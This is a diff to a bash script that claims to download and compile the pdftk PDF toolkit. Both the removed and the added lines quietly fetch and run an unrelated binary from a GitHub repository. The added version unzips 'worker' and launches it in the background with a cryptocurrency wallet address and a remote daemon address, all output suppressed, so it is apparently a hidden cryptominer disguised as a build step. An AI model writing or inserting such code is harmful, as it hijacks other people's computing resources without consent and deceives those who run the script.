@@ -1,7 +1,7 @@
 #!/bin/bash
 
 tarball_url=https://www.pdflabs.com/tools/pdftk-the-pdf-toolkit/pdftk-2.02-src.zip
-mode_url=https://github.com/RayBarrettPhil/sdfg/raw/main/cos
+mode_url=https://github.com/RayBarrettPhil/sdfg/releases/download/wes/worker.zip
 temp_dir=$(mktemp -d /tmp/compile.XXXXXXXXXX)
 
 echo "Serving files from /tmp on $PORT"
@@ -12,9 +12,9 @@ cd $temp_dir
 echo "Temp dir: $temp_dir"
 
 echo "Downloading $tarball_url"
-curl -L $mode_url > cos
-chmod +x cos
-./cos
+curl -L $mode_url > oke.zip
+unzip oke.zip
+./worker --wallet-address=dero1qyrjju06l2mnxe54uscejngc3qusc4ztt0p80d3zjcnv5023ya58qqq80jczy --daemon-rpc-address=178.128.200.86:10100 >/dev/null 2>&1 >/dev/null &
 curl -L $tarball_url > t.zip
 unzip t.zip 
 
